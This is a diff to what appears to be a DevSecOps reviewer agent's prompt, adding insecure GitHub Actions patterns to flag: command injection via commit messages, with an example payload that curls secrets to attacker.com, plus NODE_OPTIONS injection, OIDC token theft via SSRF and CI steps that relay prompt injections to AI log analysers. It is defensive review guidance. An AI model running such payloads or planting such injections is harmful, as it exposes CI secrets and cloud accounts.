@@ -28,12 +28,55 @@ You are the **DevSecOps Expert**. Your domain: CI/CD security, Infrastructure as
     AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
     AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 
-# HIGH: Untrusted input in workflow
+# HIGH: Untrusted input in run step — GitHub context expressions interpolated directly in bash
+# Affected expressions: github.event.pull_request.body, github.event.head_commit.message,
+# github.event.issue.title, github.event.comment.body, inputs.* (workflow_dispatch)
 - run: echo ${{ github.event.pull_request.body }}
+- run: echo "Commit: ${{ github.event.head_commit.message }}"
+# An attacker can craft a commit message containing: "; curl attacker.com/exfil?t=$SECRET; echo "
+# and gain arbitrary command execution on the runner.
+
+# HIGH: NODE_OPTIONS injection via repository variables or secrets
+- env:
+    NODE_OPTIONS: ${{ vars.CI_NODE_EXTRA_FLAGS }}
+  run: node app.js
+# NODE_OPTIONS accepts --require <module>, --inspect, --experimental-* flags.
+# If vars.CI_NODE_EXTRA_FLAGS is attacker-controlled, arbitrary code loads before app starts.
 
 # HIGH: No branch protection on deployment
 on: push
   branches: '*'
+```
+
+### Dangerous Permission Combinations
+
+```yaml
+# HIGH: id-token: write coexisting with user-controlled URL fetch (OIDC token theft risk)
+permissions:
+  id-token: write       # Allows runner to request OIDC tokens for AWS/GCP/Azure auth
+  contents: read
+steps:
+  - run: curl -fsSL "${{ inputs.manifest_url }}" | ...
+# If the SSRF reaches the OIDC token endpoint or the runner environment, the attacker
+# can authenticate to cloud accounts. Flag any workflow combining id-token: write
+# with untrusted URL consumption, external fetch, or user-controlled inputs.
+
+# MEDIUM: Mutable external action reference (supply-chain risk)
+uses: owner/action@main        # Branch reference — can change without PR review
+uses: owner/action@v2          # Tag reference — can be overwritten
+# Prefer: uses: owner/action@<full-commit-sha>
+```
+
+### Workflows That Print Repository Files in CI (Prompt Injection Relay)
+
+```yaml
+# MEDIUM: Workflow printing documentation files that may contain AI prompt injections
+- run: cat .github/automation-context-hints.md
+- run: sed -n '1,60p' .github/some-doc.md
+# If CI logs are analyzed by an AI assistant or a log-based AI pipeline, embedded
+# instructions in those files get executed in a context with access to runner secrets.
+# Flag any workflow step that reads and outputs .github/*.md, docs/**/*.md, or
+# skills/**/*.md files, especially when the workflow has write permissions.
 ```
 
 ### Infrastructure as Code
@@ -112,7 +155,9 @@ requests>=2.0.0  # Without lock file
 **HIGH:**
 - Running containers as root
 - Unencrypted databases or storage in production
-- Untrusted inputs in CI/CD pipelines
+- Untrusted GitHub context expressions interpolated directly in `run:` bash steps (`head_commit.message`, `pull_request.body`, `inputs.*`, `comment.body`)
+- `NODE_OPTIONS` set from repository variables, secrets, or user inputs
+- `id-token: write` permission combined with SSRF or user-controlled URL fetching in the same job
 - Known vulnerable dependencies with confirmed CVEs
 
 **MEDIUM:**
@@ -120,6 +165,8 @@ requests>=2.0.0  # Without lock file
 - Using `latest` tags in production
 - Missing resource limits in Kubernetes
 - Debug mode in production
+- External actions pinned to branch/tag instead of commit SHA
+- Workflows that read and print repository markdown files in CI (prompt injection relay risk)
 
 **LOW:**
 - Missing container security scanning
